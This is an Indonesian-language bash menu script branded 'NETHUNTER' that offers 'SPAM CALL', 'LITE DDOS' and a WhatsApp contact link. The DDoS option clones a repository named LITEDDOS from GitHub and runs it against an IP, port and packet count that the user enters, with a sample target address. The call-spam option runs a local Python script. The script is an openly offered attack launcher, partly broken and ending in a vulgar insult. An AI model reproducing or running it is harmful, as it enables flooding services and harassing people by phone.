#bin#bash

	clear
q="-e"
s='echo'
#KODE WARNA VERSI I
merah="\033[1;31m"
hijau="\033[1;32m"
kuning="\033[1;33m"
biru="\033[1;34m"
birul="\033[1;36m"
putih="\033[1;37m"
while [ $else = $ulang ]
do
clear
sleep 2

echo $q $merah
echo "   _     _     _     _     _     _     _     _     _    "
echo "  / \   / \   / \   / \   / \   / \   / \   / \   / \   "
echo " ( N ) ( E ) ( T ) ( H ) ( U ) ( N ) ( T ) ( E ) ( R )  "
echo "  \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   \_/   "



echo $q $biru '°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°'
echo $q $kuning'	     		Daftar Tools '
echo $q $biru '°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°'
echo $q $hijau' [ 1 ]  SPAM CALL  '
echo ' [ 2 ]  LITE DDOS '
echo ' [ 3 ]  CHAT ADMIN '
echo $q ' [ 0 ]  EXIT '
echo $q $biru '°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°'
echo $q $merah
read -p "PILIH [ 0-3 ] :" APA
echo $q $Green

	if [ $APA = "1" ]
then
cd
cd 404
python3 2.py


	elif [ $APA = "2" ]
then

apt update && apt upgrade -y

apt install git -y

apt install python2 -y
git clone https://github.com/4L13199/LITEDDOS
cd LITEDDOS
clear
sleep 2
echo $q $hijau'°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°'
echo $q $merah"Contoh mengirim (IP)=104.18.37.60 (PORT)=80 (JUMLAH)=100"
echo
echo "Jadi Kirimnya Contoh Begini 104.18.37.60 80 100"
echo
echo "PAHAM IN DENGAN TELITI BIAR GAK GAGAL"
echo $q $hijau'°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°'
echo $q $Red
read -p "ISI DISINI==> " sini

python2 LITEDDOS.py $sini

elif [ $APA = "3" ]
then
	xdg-open "https://api.whatsapp.com/send?phone=6285732779537"


	elif [ $APA = "0" ]
then
clear
sleep 2.1
	exit

	else
clear
sleep 2.1
echo $q $Red "ISI YANG BENER NGENTOT ANJENG"
sleep 2.1
clear
fi
done
